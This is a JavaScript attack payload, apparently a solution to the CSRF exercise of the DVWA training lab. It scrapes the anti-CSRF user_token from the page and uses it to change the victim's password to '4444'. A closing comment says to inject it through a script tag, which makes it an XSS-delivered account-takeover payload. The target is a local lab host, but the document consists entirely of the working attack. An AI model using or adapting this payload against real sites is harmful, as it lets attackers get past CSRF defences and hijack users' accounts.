const csrfPage = await fetch('http://dvwa.localtest/vulnerabilities/csrf/').then(async (res) => res.text())
const token = csrfPage.match(/'user_token' value='(.*)'/i)[1]
const password = 4444
const url = `http://dvwa.localtest/vulnerabilities/csrf/?password_new=${password}&password_conf=${password}&Change=Change&user_token=${token}`
await fetch(url).then(async (res) => res.text())

// use <script type="module" src="..."></script> to require this script
